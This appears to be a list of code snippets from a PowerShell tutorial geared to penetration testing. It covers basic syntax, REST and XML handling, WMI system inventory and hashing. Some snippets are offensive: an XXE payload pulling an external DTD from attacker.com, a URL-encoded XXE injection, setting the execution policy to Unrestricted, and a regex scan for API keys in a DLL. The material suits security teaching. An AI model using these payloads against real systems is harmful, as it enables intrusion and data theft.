["```\n PS C:\\> $PSVersionTable\nName                      Value\n----                      ----- PSVersion                 7.3.0 PSEdition                 Core\nGitCommitId               7.3.0\nOS                        Microsoft Windows 10.0.19042\nPlatform                  Win32NT\nPSCompatibleVersions        1.0, 2.0, 3.0, 4.0…}\nPSRemotingProtocolVersion   2.3\nSerializationVersion        1.1.0.1\n```", "```\n PS C:>Get-ExecutionPolicy -List\n        Scope ExecutionPolicy\n        ----- ---------------\nMachinePolicy       Undefined\n   UserPolicy       Undefined\n      Process       Undefined\n  CurrentUser       Undefined\n LocalMachine    RemoteSigned\nPS C:>\n```", "```\n PS C:\\> Set-ExecutionPolicy Unrestricted\n```", "```\n PS C:\\> find-module -tag SSH\n```", "```\n PS C:\\> Install-Module -Name SSH\n```", "```\n PS C:\\> Import-Module .\\PowerSploit.psd1\n```", "```\n PS C:\\> Get-Command -module SSH\nCommandType   Name               Version    Source\n-----------   ----               -------    ------\nFunction      Invoke-SSHCommand  1.0.0      SSH\n```", "```\n PS C:\\> get-help Get-Location\n```", "```\n     $name = \"Andrew Blyth\"\n    ```", "```\n     $age = 57\n    ```", "```\n     $myfruits = @(\"apple\", \"banana\", \"orange\")\n    ```", "```\n     $person = @{\n        Name = \"Andrew Blyth\"\n        Age = 57}\n    ```", "```\n if (condition) {\n    # Code block to execute if the condition is true\n}\n```", "```\n $file = \"C:\\mydatafile.txt\"\nif (Test-Path $file) {\n    Write-Host \"The file exists!\" } else {\n    Write-Host \"File not found.\"}\n```", "```\n     for ($i = 1; $i -le 5; $i++) {\n        Write-Host \"For loop iteration: $i\"}\n    ```", "```\n     $fruits = @(\"Apple\", \"Banana\", \"Orange\")\n    foreach ($fruit in $fruits) {\n        Write-Host \"I like $fruit\"}\n    ```", "```\n     $i = 1\n    while ($i -le 5) {\n        Write-Host \"While loop iteration: $i\"\n        $i++}\n    ```", "```\n     $i = 1\n    do {\n        Write-Host \"Do...While loop iteration: $i\"\n        $i++\n    } while ($i -le 5)\n    ```", "```\n     $numbers = 1..5\n    $numbers | ForEach-Object {\n        Write-Host \"Pipeline Loop: $_\"}\n    ```", "```\n $repoUrl = \"https://api.snowcapcyber.com/repo\"\n$response = Invoke-RestMethod -Uri $repoUrl\n$response\n```", "```\n $repoUrl = \"https://api.snowcapcyber.com/repo\"\n$response = Invoke-RestMethod -Uri $repoUrl\n$repoObject = ConvertFrom-Json $response\nWrite-Host \"Repository Name: $($repoObject.name)\"\nWrite-Host \"Description: $($repoObject.description)\"\n```", "```\n $payload = @{\n    \"username\" = \"admin\"\n    \"password\" = \"P@ssw0rd123\"\n} | ConvertTo-Json\n$headers = @{\n    \"Content-Type\" = \"application/json\" }\nInvoke-RestMethod -Uri \"https://snowcapcyber.com/api/login\" -Method Post -Body $payload -Headers $headers\n```", "```\n $jsonFilePath = \"C:\\path\\to\\file.json\"\n$jsonData = Get-Content -Raw -Path $jsonFilePath | ConvertFrom-Json\n# Add a new property\n$jsonData | Add-Member -Name \"role\" -Value \"admin\"\n# Save updated JSON back to the file\n$jsonData | ConvertTo-Json | Set-Content -Path $jsonFilePath\n```", "```\n $url = \"https://snowcapcyber.com/data.json\"\n$response = Invoke-RestMethod -Uri $url\n$data = $response.data\nforeach ($item in $data) {\n    Write-Host \"Name: $($item.name)\"\n    Write-Host \"Age: $($item.age)\"\n    Write-Host \"Occupation: $($item.occupation)\"\n    Write-Host \"\"}\n```", "```\n $xmlFilePath = \"C:\\MyData\\config.xml\"\n$xmlContent = Get-Content -Path $xmlFilePath\n$xmlDoc = [xml]$xmlContent\n$setting1 = $xmlDoc.configuration.setting1\n$setting2 = $xmlDoc.configuration.setting2\nWrite-Host \"Setting 1: $setting1\"\nWrite-Host \"Setting 2: $setting2\"\n```", "```\n <employees>\n    <employee id=\"1\">\n        <name>Andrew Blyth</name>\n        <age>57</age>\n        <position>Manager</position>\n    </employee>\n    </employee>\n</employees>\n```", "```\n $xmlFilePath = \"C:\\MyData\\employees.xml\"\n$xmlContent = Get-Content -Path $xmlFilePath\n$xmlDoc = [xml]$xmlContent\n$employees = $xmlDoc.employees.employee\nforeach ($employee in $employees) {\n    $id = $employee.id\n    $name = $employee.name\n    $age = $employee.age\n    $position = $employee.position\n    Write-Host \"Employee ID: $id\"\n    Write-Host \"Name: $name\"\n    Write-Host \"Age: $age\"\n    Write-Host \"Position: $position\"\n    Write-Host \"\"\n}\n```", "```\n <userSettings>\n    <setting name=\"theme\" value=\"dark\" />\n    <setting name=\"language\" value=\"en-US\" />\n</userSettings>\n```", "```\n $xmlFilePath = \"C:\\MyData\\settings.xml\"\n$xmlContent = Get-Content -Path $xmlFilePath\n$xmlDoc = [xml]$xmlContent\n$xmlDoc.userSettings.setting | Where-Object { $_.name -eq \"theme\" } | ForEach-Object {\n    $_.value = \"light\"}\n$xmlDoc.Save($xmlFilePath)\n```", "```\n $payload = @\"\n<!DOCTYPE root [\n<!ENTITY % remote SYSTEM \"http://attacker.com/evil.dtd\">\n%remote;\n]>\n<root>\n    <data>Confidential information</data>\n</root>\n\"@\n# Save the payload to a file\n$payloadFilePath = \"C:\\MyData\\payload.xml\"\n$payload | Out-File -FilePath $payloadFilePath\n```", "```\n $maliciousPayload = @\"\n<root>\n    <data>\n        <name>John Smith</name>\n        <age>30</age>\n        <!-- XXE injection payload goes here -->\n    </data>\n</root>\"@\n$injectionPoint = \"http://snowcapcyber.com/api/data?xml=\" + [System.Web.HttpUtility]::UrlEncode($maliciousPayload)\n```", "```\n $softwareList = Get-WmiObject -Class Win32_Product | Select-Object -Property Name, Vendor, Version\nforeach ($software in $softwareList) {\n    Write-Host \"Name: $($software.Name)\"\n    Write-Host \"Vendor: $($software.Vendor)\"\n    Write-Host \"Version: $($software.Version)\"\n    Write-Host \"\" }\n```", "```\n $networkAdapters = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPAddress -ne $null }\nforeach ($adapter in $networkAdapters) {\n    Write-Host \"Adapter Description: $($adapter.Description)\"\n    Write-Host \"IP Address: $($adapter.IPAddress[0])\"\n    Write-Host \"MAC Address: $($adapter.MACAddress)\"\n    Write-Host \"\"}\n```", "```\n $excel = New-Object -ComObject Excel.Application\n$workbook = $excel.Workbooks.Add()\n$sheet = $workbook.Worksheets.Item(1)\n$sheet.Cells.Item(1,1) = \"Name\"\n$sheet.Cells.Item(1,2) = \"Age\"\n$sheet.Cells.Item(2,1) = \"John Doe\"\n$sheet.Cells.Item(2,2) = 30\n$excel.Visible = $true\n```", "```\n $filePath = \"C:\\MyData\\file.txt\"\n$md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider\n$fileStream = [System.IO.File]::OpenRead($filePath)\n$hash = $md5.ComputeHash($fileStream)\n$fileStream.Close()\n$hashString = [System.BitConverter]::ToString($hash) -replace \"-\", \"\"\nWrite-Host \"MD5 Hash: $hashString\"\n```", "```\n $url = \"https://api.snowcapcyber.com/data\"\n$request = [System.Net.WebRequest]::Create($url)\n$response = $request.GetResponse()\n$stream = $response.GetResponseStream()\n$reader = New-Object -TypeName System.IO.StreamReader -ArgumentList $stream\n$responseText = $reader.ReadToEnd()\n$reader.Close()\n$response.Close()\nWrite-Host \"Response Body:\"\nWrite-Host $responseText\n```", "```\n $assemblyPath = \"C:\\MyData\\Assembly.dll\"\n$strings = [System.IO.File]::ReadAllText($assemblyPath)\n# Search for potential sensitive information\n$apiKeyPattern = \"API_KEY=[A-Za-z0-9]+\"\n$matches = [System.Text.RegularExpressions.Regex]::Matches($strings, $apiKeyPattern)\nWrite-Host \"Potential API Keys found:\"\nforeach ($match in $matches) {\n    Write-Host $match.Value }\n```"]